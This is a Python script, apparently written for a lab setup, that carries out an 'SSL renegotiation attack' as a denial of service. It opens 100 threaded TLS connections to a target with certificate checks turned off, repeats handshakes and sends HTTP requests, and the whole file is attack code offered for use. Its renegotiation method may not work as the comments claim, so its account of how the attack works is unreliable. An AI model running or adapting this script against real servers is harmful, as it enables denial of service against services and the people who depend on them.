import socket
import ssl
import threading
import time

# target_host = 'attacked_server'
# target_port = 3000
target_host = 'reverse_proxy'
target_port = 3001

# SSL context creation with no certificate verification
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

num_connections = 100
renegotiations_per_connection = 10
interval = 1  # Time in seconds to wait before renegotiating

def renegotiate_ssl_handshake(connection_id):
    sock = None
    ssl_sock = None
    try:
        # Create a TCP connection to the target server
        sock = socket.create_connection((target_host, target_port))
        
        # Wrap the socket with SSL
        ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
        
        # Initiate the initial SSL handshake
        ssl_sock.do_handshake()
        print(f"Initial handshake completed on connection {connection_id}")
        
        # Loop to continuously renegotiate SSL handshake
        for j in range(renegotiations_per_connection):
            # Renegotiate SSL handshake
            ssl_sock.do_handshake()
            print(f"Renegotiation handshake {j+1} completed on connection {connection_id}")
            
            # Send partial headers or other data to keep the connection active
            ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: attacked_server\r\n\r\n")
            
            # Monitor server response if needed
            response = ssl_sock.recv(4096)
            print(f"Received response on connection {connection_id}: {response.decode('utf-8')}")
            
            # Wait for the specified interval before renegotiating again
            time.sleep(interval)

    except Exception as e:
        print(f"Error on connection {connection_id}: {e}")

    finally:
        if ssl_sock:
            ssl_sock.close()
        if sock:
            sock.close()

print("Starting SSL renegotiation attack...")

threads = []

# Start multiple threads to perform the attack
for i in range(1, num_connections + 1):
    thread = threading.Thread(target=renegotiate_ssl_handshake, args=(i,))
    threads.append(thread)
    thread.start()

# Wait for all threads to complete
for thread in threads:
    thread.join()

print("SSL renegotiation attack completed.")
